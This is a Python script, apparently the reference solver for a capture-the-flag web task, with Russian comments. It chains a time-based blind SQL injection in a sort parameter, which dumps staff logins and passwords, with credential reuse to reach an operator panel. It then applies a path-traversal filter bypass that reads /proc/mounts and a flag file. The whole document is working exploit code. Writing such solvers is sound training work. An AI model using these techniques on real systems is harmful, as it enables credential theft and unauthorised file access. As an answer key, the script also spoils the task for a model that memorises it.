#!/usr/bin/env python3
"""Эталонный солвер таска «Панель допуска».

Цепочка:
  1. Time-based blind SQLi в параметре sort (ORDER BY) журнала выдачи карт.
  2. Через information_schema находим таблицу staff, затем посимвольно
     дампаем все логин:пароль из неё — бинарным поиском по ASCII-коду
     символа (ASCII(SUBSTRING(...))>N), а не прямым сравнением с
     литералом. Так можно извлечь любой символ, включая кавычку внутри
     одного из паролей, не думая про экранирование в payload.
  3. В staff три учётки, но какая из них реально открывает панель
     оператора — заранее неизвестно (это не записано в БД). Логинимся
     поочерёдно под каждой (обычная форма логина, prepared statements) и
     смотрим, у кого на /panel есть «Экспорт протокола».
  4. Path traversal в /panel/export через байпас нерекурсивного
     replace("../") -> "....//", читаем /proc/mounts: там уже смонтирован
     архив с флагом, остаётся прочитать ledger.txt.

Запуск: python3 solver.py http://localhost:63333
"""

import re
import sys
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:63333"
SLEEP_SECONDS = 0.5

session = requests.Session()


def timed_sort(payload: str) -> float:
    start = time.monotonic()
    response = session.post(
        f"{BASE}/archive/access-log",
        data={"sort": payload},
        timeout=90,
    )
    elapsed = time.monotonic() - start
    response.raise_for_status()
    return elapsed


def measure_threshold() -> float:
    samples = [timed_sort("log_date") for _ in range(3)]
    baseline = sorted(samples)[len(samples) // 2]
    threshold = baseline + 0.25
    print(f"[+] baseline = {baseline:.3f}s, threshold = {threshold:.3f}s")
    return threshold


THRESHOLD = None


def check(condition: str) -> bool:
    """Возвращает True, если условие истинно (ответ приходит с задержкой)."""
    payload = (
        f"(CASE WHEN ({condition}) "
        f"THEN (SELECT 1 FROM pg_sleep({SLEEP_SECONDS})) ELSE 1 END)"
    )
    return timed_sort(payload) > THRESHOLD


def extract_string(query: str, max_length: int = 96) -> str:
    """Посимвольная экстракция строки из SQL-выражения query бинарным поиском."""
    result = []
    for position in range(1, max_length + 1):
        if not check(f"ASCII(SUBSTRING(({query}),{position},1))>31"):
            break
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result.append(chr(low))
        print(f"    > {''.join(result)!r}", flush=True)
    return "".join(result)


def main() -> None:
    global THRESHOLD
    THRESHOLD = measure_threshold()

    print("[*] шаг 1: ищем таблицы через information_schema")
    tables = extract_string(
        "SELECT string_agg(table_name, ',') FROM information_schema.tables "
        "WHERE table_schema='public' AND table_type='BASE TABLE'"
    )
    print(f"[+] таблицы: {tables}")

    if "staff" not in tables:
        print("[-] таблица staff не найдена")
        sys.exit(1)

    print("[*] шаг 2: дампим логины и пароли из staff")
    creds_raw = extract_string(
        "SELECT string_agg(username || ':' || password, ';') FROM staff"
    )
    print(f"[+] учётные записи: {creds_raw}")

    creds = {}
    for record in creds_raw.split(";"):
        if ":" in record:
            login, password = record.split(":", 1)
            creds[login] = password

    print("[*] шаг 3: перебираем логины, ищем у кого есть доступ к панели оператора")
    target = None
    for login, password in creds.items():
        response = session.post(
            f"{BASE}/login",
            data={"username": login, "password": password},
            allow_redirects=False,
            timeout=15,
        )
        if response.status_code != 302:
            print(f"    {login}: логин не удался (HTTP {response.status_code})")
            continue

        panel = session.get(f"{BASE}/panel", timeout=15)
        if "Экспорт протокола" in panel.text:
            print(f"[+] {login} — есть доступ к панели оператора")
            target = login
            break
        print(f"    {login}: вошёл, но «Недостаточно допуска»")

    if target is None:
        print("[-] ни одна из учёток не даёт доступ к панели оператора")
        sys.exit(1)
    print(f"[+] авторизованы как {target}")

    def read_via_traversal(path: str) -> str:
        depth = path.count("/") + 3
        traversal = "....//" * depth
        bypass = traversal + path.lstrip("/")
        response = session.get(
            f"{BASE}/panel/export",
            params={"file": bypass},
            timeout=15,
        )
        if response.status_code != 200:
            print(f"[-] path traversal {path}: HTTP {response.status_code}")
            sys.exit(1)
        return response.text

    print("[*] шаг 4: path traversal -> читаем /proc/mounts")
    mounts = read_via_traversal("/proc/mounts")
    for line in mounts.splitlines():
        if "archive" in line or "labx" in line:
            print(f"    mounts> {line}")

    mountpoint = None
    for line in mounts.splitlines():
        parts = line.split()
        if len(parts) >= 2 and ("labx" in parts[1] or "archive" in parts[1]):
            mountpoint = parts[1]
            break
    if mountpoint is None:
        print("[-] не найден смонтированный архив в /proc/mounts")
        sys.exit(1)
    print(f"[+] архив смонтирован в {mountpoint}")

    ledger = read_via_traversal(f"{mountpoint}/ledger.txt")
    print(f"[+] ledger.txt:\n{ledger}")

    match = re.search(r"FLAG=([^\s]+)", ledger)
    if match is None:
        print("[-] флаг не найден")
        sys.exit(1)
    print(f"\n[+] FLAG: {match.group(1)}")


if __name__ == "__main__":
    main()
